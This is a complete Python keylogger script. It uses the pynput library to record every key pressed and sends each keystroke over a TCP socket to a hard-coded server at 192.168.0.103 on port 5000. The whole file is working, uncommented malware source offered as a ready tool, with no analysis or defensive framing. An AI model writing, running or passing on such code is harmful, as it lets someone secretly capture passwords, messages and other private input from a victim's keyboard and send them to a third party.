import socket
from pynput import keyboard # type: ignore

SERVER_IP = "192.168.0.103"
SERVER_PORT = 5000

def send_to_server(data):
    try:
        print(f"Trying to connect to the server {SERVER_IP}:{SERVER_PORT}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            print("Connection established with the server.")
            s.sendall(data.encode('utf-8'))
            print(f"Data sent to server: {data}")
    except ConnectionRefusedError:
        print("Connection refused by the server. Is it running?")
    except socket.error as e:
        print(f"Socket error: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

def on_key_press(key):
    try:
        key_str = str(key).replace("'", "")
        print(f"Key pressed: {key_str}")
        send_to_server(key_str)
    except Exception as e:
        print(f"Error processing key press: {e}")

def start_keylogger():
    print("Starting the keylogger...")
    try:
        with keyboard.Listener(on_press=on_key_press) as listener:
            listener.join()
    except Exception as e:
        print(f"Critical error in the keylogger: {e}")

if __name__ == "__main__":
    start_keylogger()